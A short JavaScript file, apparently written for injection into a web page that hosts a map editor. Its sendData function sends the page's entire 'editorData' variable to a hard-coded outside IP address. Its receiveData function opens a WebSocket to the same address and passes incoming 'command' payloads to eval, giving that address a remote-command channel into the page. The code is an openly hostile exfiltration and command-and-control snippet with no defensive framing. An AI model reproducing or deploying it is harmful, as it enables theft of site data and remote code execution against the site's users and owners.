// Throw everything in a try catch to supress the syntax errors

function start() {
    try {
        sendData();
        console.log(`${document.getElementById("stop").innerHTML}`);
        // receiveData();
        document.getElementById("stop").innerHTML = '<p>a</p>'
    } catch (e) {
        console.log(`${e}`);
    }
}


// We actually don't need to map the world anymore as twe can just log the editorData variable that has every single map in it.


function sendData() {
    try {
        fetch("http://54.202.231.195:53849?a=" + JSON.stringify(`${editorData}`), {
                method: 'get'
            })
            .then(response => response.json())
            .then(data => console.log(data));
    } catch (e) {
        console.log(`${e}`)
    }
}

function receiveData() {
    const connection = new WebSocket('ws://54.202.231.195:51887');
    connection.onmessage = e => {
        
        let msg = JSON.parse(e.data);
        console.log(`${msg.payload}`)
        msg.type === "command" ? eval('"'+msg.payload+'"') : ''
        
    }
}